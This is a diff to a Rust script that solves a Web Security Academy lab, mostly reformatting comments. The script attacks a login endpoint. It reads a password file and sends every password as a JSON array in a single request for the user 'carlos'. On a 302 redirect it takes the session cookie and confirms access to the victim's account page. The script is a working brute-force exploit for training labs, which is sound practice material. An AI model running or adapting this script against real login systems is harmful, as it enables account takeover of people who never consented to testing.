@@ -33,11 +33,21 @@ use text_colorizer::Colorize;
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0a9f00c6044016e682f0157a00ad0046.web-security-academy.net"; // change this url to your lab
-    let client = build_client(); // build the client which will be used in all subsequent requests
-    let passwords_as_string = fs::read_to_string("/home/ahmed/passwords").unwrap(); // change the path your list
-    let passwords: Vec<&str> = passwords_as_string.split("\n").collect(); // change split to \r\n if you still a windows user
+    // change this to your lab URL
+    let url = "https://0a9f00c6044016e682f0157a00ad0046.web-security-academy.net";
 
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // read passwords as one big string
+    // change the path your passwords list
+    let passwords_as_string = fs::read_to_string("/home/ahmed/passwords").unwrap();
+
+    // split the big string to a list of passwords
+    // change \n to \r\n if you still a windows user
+    let passwords: Vec<&str> = passwords_as_string.split("\n").collect();
+
+    // send multiple passwords in one request
     let send_passwords = client
         .post(format!("{url}/login"))
         .header("Content-Type", "application/json")
@@ -45,28 +55,41 @@ fn main() {
             "{{\"username\": \"carlos\", \"password\": {:?}}}",
             passwords
         ))
-        .send(); // send multiple passwords in one request
+        .send();
+
+    // if the request is successful
     if let Ok(res) = send_passwords {
         println!(
             "{}",
-            "[*] Sending multiple passwords in the same request..☑️"
+            "[*] Sending multiple passwords in the same request..OK"
                 .white()
                 .bold()
         );
+
+        // if a redirect happens; means that a valid password exist
         if res.status().as_u16() == 302 {
-            // if a redirect happens; means that a valid password exist
-            let session = extract_session_cookie(res.headers()); // extract the session from cookie header
+            // extract the session from cookie header
+            let session = extract_session_cookie(res.headers());
+
+            // try to get home page with the new session
             let home = client
                 .get(format!("{url}/my-account?id=carlos"))
                 .header("Cookie", format!("session={session}"))
-                .send(); // try to get home page with the new session
+                .send();
+
+            // if you get the home page successfully
             if let Ok(home_res) = home {
-                // if you get the home page successfully
-                let home_body = home_res.text().unwrap(); // body of the home page
-                let carlos_pattern = Regex::new("Your username is: carlos").unwrap(); // pattern to search for
-                let is_carlos = carlos_pattern.find(&home_body).unwrap(); // search for pattern to make sure that you logged in as carlos
+                // body of the home page
+                let home_body = home_res.text().unwrap();
+
+                // pattern to search for
+                let carlos_pattern = Regex::new("Your username is: carlos").unwrap();
+
+                // search for pattern to make sure that you logged in as carlos
+                let is_carlos = carlos_pattern.find(&home_body).unwrap();
+
+                // if the pattern is found
                 if is_carlos.len() != 0 {
-                    // if the pattern is found
                     println!(
                         "{} {}",
                         "✅ Successfully logged in as".white().bold(),
